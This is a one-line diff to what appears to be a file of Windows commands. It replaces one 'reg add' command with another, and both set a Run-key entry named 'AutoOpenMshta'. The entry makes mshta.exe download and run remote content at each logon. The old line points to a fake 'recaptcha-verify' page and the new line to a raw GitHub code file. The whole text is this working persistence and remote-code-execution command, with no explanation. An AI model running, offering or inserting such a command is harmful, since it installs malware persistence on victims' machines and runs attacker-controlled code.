@@ -1,1 +1,1 @@
-reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AutoOpenMshta /t REG_SZ /d "\"C:\Windows\system32\mshta.exe\" https://dovip.win/verify/recaptcha-verify" /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AutoOpenMshta /t REG_SZ /d "\"C:\Windows\system32\mshta.exe\" https://raw.githubusercontent.com/IBOGRO/telsle.com/refs/heads/main/code.txt" /f
